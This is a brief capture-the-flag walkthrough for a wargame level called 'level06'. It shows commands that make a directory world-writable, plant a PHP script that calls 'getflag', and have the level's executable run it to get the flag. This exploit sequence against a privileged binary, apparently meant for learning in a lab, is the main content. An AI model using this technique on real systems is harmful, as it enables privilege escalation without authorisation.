# We found 2 files:
- PHP file
- executable file

# We dumped the executable with:
hexdump ./level06 -C

# We noticed that he execute the file 'level06.php'

chomod 777 .

# We created a file name '/tmp/level06.php'
#===================================================
    #!/usr/bin/php

    <?php
        echo exec('getflag');
    ?>
#===================================================

mv /tmp/level06.php .
./level06 level06.php

# TADAAAAAAAAA
